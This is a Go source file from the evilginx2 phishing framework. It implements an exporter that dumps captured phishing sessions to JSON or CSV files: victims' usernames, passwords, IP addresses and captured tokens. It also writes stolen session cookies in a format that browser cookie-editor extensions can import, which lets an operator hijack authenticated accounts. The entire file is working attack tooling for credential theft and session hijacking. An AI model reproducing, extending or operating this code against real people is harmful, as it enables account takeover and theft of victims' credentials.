package core

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// Exporter handles session data export
type Exporter struct {
	db *database.Database
}

// ExportSession represents a session for export
type ExportSession struct {
	ID           int               `json:"id"`
	Phishlet     string            `json:"phishlet"`
	Username     string            `json:"username"`
	Password     string            `json:"password"`
	LandingURL   string            `json:"landing_url"`
	UserAgent    string            `json:"user_agent"`
	RemoteAddr   string            `json:"remote_addr"`
	CreateTime   string            `json:"create_time"`
	UpdateTime   string            `json:"update_time"`
	Custom       map[string]string `json:"custom,omitempty"`
	CookieTokens map[string]string `json:"cookie_tokens,omitempty"`
	BodyTokens   map[string]string `json:"body_tokens,omitempty"`
	HttpTokens   map[string]string `json:"http_tokens,omitempty"`
}

// NewExporter creates a new Exporter instance
func NewExporter(db *database.Database) *Exporter {
	return &Exporter{db: db}
}

// ExportToJSON exports sessions to JSON format
func (e *Exporter) ExportToJSON(path string, ids []int) error {
	sessions, err := e.getSessions(ids)
	if err != nil {
		return err
	}

	if len(sessions) == 0 {
		return fmt.Errorf("no sessions to export")
	}

	// Convert to export format
	var exports []ExportSession
	for _, s := range sessions {
		exports = append(exports, e.toExportSession(s))
	}

	// Create file
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()

	// Write JSON with indentation
	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(exports); err != nil {
		return fmt.Errorf("failed to encode JSON: %v", err)
	}

	log.Success("exported %d sessions to: %s", len(exports), path)
	return nil
}

// ExportToCSV exports sessions to CSV format
func (e *Exporter) ExportToCSV(path string, ids []int) error {
	sessions, err := e.getSessions(ids)
	if err != nil {
		return err
	}

	if len(sessions) == 0 {
		return fmt.Errorf("no sessions to export")
	}

	// Create file
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()

	// Create CSV writer
	writer := csv.NewWriter(file)
	defer writer.Flush()

	// Write header
	header := []string{
		"id",
		"phishlet",
		"username",
		"password",
		"landing_url",
		"user_agent",
		"remote_addr",
		"create_time",
		"update_time",
	}
	if err := writer.Write(header); err != nil {
		return fmt.Errorf("failed to write header: %v", err)
	}

	// Write data rows
	for _, s := range sessions {
		row := []string{
			strconv.Itoa(s.Id),
			s.Phishlet,
			s.Username,
			s.Password,
			s.LandingURL,
			s.UserAgent,
			s.RemoteAddr,
			time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04:05"),
			time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04:05"),
		}
		if err := writer.Write(row); err != nil {
			return fmt.Errorf("failed to write row: %v", err)
		}
	}

	log.Success("exported %d sessions to: %s", len(sessions), path)
	return nil
}

// ExportCookies exports session cookies in a format suitable for browser import
func (e *Exporter) ExportCookies(path string, sessionID int) error {
	sessions, err := e.db.ListSessions()
	if err != nil {
		return err
	}

	var session *database.Session
	for _, s := range sessions {
		if s.Id == sessionID {
			session = s
			break
		}
	}

	if session == nil {
		return fmt.Errorf("session not found: %d", sessionID)
	}

	if len(session.CookieTokens) == 0 {
		return fmt.Errorf("no cookies in session: %d", sessionID)
	}

	// Build cookie export format (compatible with EditThisCookie/StorageAce)
	type CookieExport struct {
		Domain   string `json:"domain"`
		Name     string `json:"name"`
		Value    string `json:"value"`
		Path     string `json:"path"`
		HttpOnly bool   `json:"httpOnly"`
		Secure   bool   `json:"secure"`
	}

	var cookies []CookieExport
	for domain, tokens := range session.CookieTokens {
		for _, token := range tokens {
			cookies = append(cookies, CookieExport{
				Domain:   domain,
				Name:     token.Name,
				Value:    token.Value,
				Path:     token.Path,
				HttpOnly: token.HttpOnly,
				Secure:   true,
			})
		}
	}

	// Create file
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(cookies); err != nil {
		return fmt.Errorf("failed to encode cookies: %v", err)
	}

	log.Success("exported %d cookies to: %s", len(cookies), path)
	return nil
}

// getSessions retrieves sessions by IDs (empty = all)
func (e *Exporter) getSessions(ids []int) ([]*database.Session, error) {
	allSessions, err := e.db.ListSessions()
	if err != nil {
		return nil, err
	}

	if len(ids) == 0 {
		return allSessions, nil
	}

	// Filter by IDs
	idMap := make(map[int]bool)
	for _, id := range ids {
		idMap[id] = true
	}

	var filtered []*database.Session
	for _, s := range allSessions {
		if idMap[s.Id] {
			filtered = append(filtered, s)
		}
	}

	return filtered, nil
}

// toExportSession converts database session to export format
func (e *Exporter) toExportSession(s *database.Session) ExportSession {
	export := ExportSession{
		ID:           s.Id,
		Phishlet:     s.Phishlet,
		Username:     s.Username,
		Password:     s.Password,
		LandingURL:   s.LandingURL,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CreateTime:   time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04:05"),
		UpdateTime:   time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04:05"),
		Custom:       s.Custom,
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: make(map[string]string),
	}

	// Flatten cookie tokens
	for domain, tokens := range s.CookieTokens {
		for _, token := range tokens {
			key := fmt.Sprintf("%s:%s", domain, token.Name)
			export.CookieTokens[key] = token.Value
		}
	}

	return export
}

// GetDefaultExportPath returns a default export path with timestamp
func GetDefaultExportPath(format string) string {
	timestamp := time.Now().Format("20060102_150405")
	return filepath.Join(".", fmt.Sprintf("evilginx_export_%s.%s", timestamp, format))
}
